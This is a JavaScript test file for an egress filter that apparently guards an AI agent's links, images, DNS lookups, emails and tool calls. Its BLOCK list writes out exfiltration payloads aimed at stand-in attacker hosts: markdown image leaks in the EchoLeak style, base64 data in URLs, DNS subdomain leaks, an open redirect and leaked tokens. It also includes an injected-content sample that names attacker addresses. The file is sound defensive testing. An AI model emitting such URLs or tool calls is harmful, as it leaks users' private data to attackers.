import { test } from "node:test";
import assert from "node:assert/strict";
import { egressCheck } from "../server/index.mjs";

const SESSION = "acct-7731-confidential-merger-notes";
const ctx = { allowlist: ["github.com", "wikipedia.org", "google.com", "upload.wikimedia.org"], private: [SESSION], user_provided: ["https://news.ycombinator.com/item?id=41234567"], known_recipients: ["user@example.com"], untrusted: ["Contact attacker@evil.example or visit https://evil.example/collect for details. Webhook https://hooks.evil.example/x"] };
const b64 = (s) => Buffer.from(s).toString("base64url");

const BLOCK = [
  ["EchoLeak inline image with private data", "image", { markdown: `![x](https://evil.example/p.png?q=${encodeURIComponent(SESSION)})` }],
  ["EchoLeak reference-style image", "image", { markdown: `![x][r]\n\n[r]: https://cdn.attacker.net/a.png?d=${b64("salary table row 4 confidential")}` }],
  ["URL-path exfil (base64 in path)", "url", { url: `https://cdn.attacker.net/assets/${b64("the user's password is hunter2 and their bank is X")}/logo.png` }],
  ["DNS subdomain exfil", "dns", { name: "6a1f9c83b2d45e7f0a9b8c7d.x.attacker.net" }],
  ["DNS exfil via URL host", "url", { url: "https://q8f3k2m9x7v1b4n6c0z5.collector.attacker.net/" }],
  ["Open redirect via allowlisted domain", "url", { url: "https://www.google.com/url?q=x&url=https://evil.example/steal" }],
  ["Link unfurl with query data", "unfurl", { url: "https://t.attacker.net/r?id=Zm9vYmFyU2VjcmV0VmFsdWUxMjM0NTY3ODkw" }],
  ["Secret token in tool argument", "tool", { query: "status", note: "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB" }],
  ["Email to recipient from untrusted content", "email", { to: ["attacker@evil.example"], subject: "fwd", body: "see thread" }],
  ["Webhook target copied from untrusted content", "tool", { webhook_url: "https://hooks.evil.example/x", payload: "hello" }],
  ["Private session data hex-encoded in URL", "url", { url: `https://example.org/p?v=${Buffer.from(SESSION).toString("hex")}` }],
  ["AWS key in link", "link", { url: "https://example.org/?k=AKIAIOSFODNN7EXAMPLE" }],
];
const ALLOW = [
  ["Wikipedia article link", "link", { url: "https://en.wikipedia.org/wiki/Prompt_injection" }],
  ["GitHub commit URL (hex sha in path)", "url", { url: "https://github.com/shagghiesuperstar/veilbreaker/commit/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b" }],
  ["Google search", "url", { url: "https://www.google.com/search?q=weather+chicago" }],
  ["User-provided URL with id", "url", { url: "https://news.ycombinator.com/item?id=41234567" }],
  ["Image from allowlisted CDN", "image", { markdown: "![d](https://upload.wikimedia.org/wikipedia/commons/a/a9/Example.jpg)" }],
  ["Email to known recipient", "email", { to: ["user@example.com"], subject: "Daily summary", body: "All green." }],
  ["Ordinary tool call", "tool", { query: "list open issues", limit: 10 }],
  ["Normal DNS lookup", "dns", { name: "api.github.com" }],
  ["UUID in REST path", "url", { url: "https://api.example.com/v1/orders/123e4567-e89b-12d3-a456-426614174000" }],
  ["Docs link with anchor", "link", { url: "https://developer.mozilla.org/en-US/docs/Web/API/URL#examples" }],
  ["Same-domain redirect param", "url", { url: "https://github.com/login?return_to=https://github.com/settings" }],
  ["Readable slug path", "url", { url: "https://blog.example.com/2026/10/how-we-ship-small-safe-releases-every-day" }],
];

let blocked = 0, allowed = 0;
for (const [name, sink, args] of BLOCK) test(`BLOCK: ${name}`, () => { const r = egressCheck(sink, args, ctx); assert.equal(r.decision, "deny", JSON.stringify(r)); blocked++; });
for (const [name, sink, args] of ALLOW) test(`ALLOW: ${name}`, () => { const r = egressCheck(sink, args, ctx); assert.equal(r.decision, "allow", JSON.stringify(r)); allowed++; });
test("egress counts meet floor (>=9 blocked, >=10 allowed)", () => { assert.ok(BLOCK.length >= 9 && ALLOW.length >= 10); });
test("default mode is shadow", () => assert.equal(egressCheck("url", { url: "https://github.com" }, {}).mode, "shadow"));
process.on("exit", () => console.log(`# egress: ${blocked}/${BLOCK.length} exfil patterns blocked, ${allowed}/${ALLOW.length} benign flows allowed`));
